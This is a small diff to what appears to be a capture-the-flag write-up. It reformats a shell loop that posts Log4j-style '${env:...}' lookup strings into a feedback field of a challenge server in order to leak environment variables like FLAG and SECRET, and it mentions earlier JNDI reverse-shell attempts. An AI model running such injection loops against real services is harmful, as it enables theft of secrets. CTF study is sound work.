@@ -29,4 +29,7 @@ So, After Alot of tries to set up a Reverse shell using JNDI, I couldnt make it 
 
 So i made this simple for loop with some common names.
 
-<pre> for i in Admin admin ADMIN user USER User Owner Root root PCTF pctf MASONC masonc Pctf pCTF FLAG FLAG_CTF CTF SECRET FLAG KEY SECRET_FLAG FLAGS FLAGO flag secret secret_flag FLAG_SECRET secret_flag FLAG_SECRET secret_FLAG FLAG_SECRET; do echo "Trying \${env:$i}"; curl -s -X POST http://18.212.136.134:8080/feedback -H "X-Requested-With: XMLHttpRequest" -H "Content-Type:application/x-www-form-urlencoded;charset=UTF-8" -d "feedback=\${env:$i}" | grep -o "User .*"; done </pre>
+<pre> for i in <br>
+  Admin admin ADMIN user USER User Owner Root root PCTF pctf MASONC masonc Pctf pCTF FLAG FLAG_CTF CTF SECRET FLAG KEY SECRET_FLAG FLAGS FLAGO flag secret secret_flag FLAG_SECRET secret_flag FLAG_SECRET secret_FLAG FLAG_SECRET; <br>
+  do echo "Trying \${env:$i}"; <br>
+  curl -s -X POST http://18.212.136.134:8080/feedback -H "X-Requested-With: XMLHttpRequest" -H "Content-Type:application/x-www-form-urlencoded;charset=UTF-8" -d "feedback=\${env:$i}" | grep -o "User .*"; done </pre>
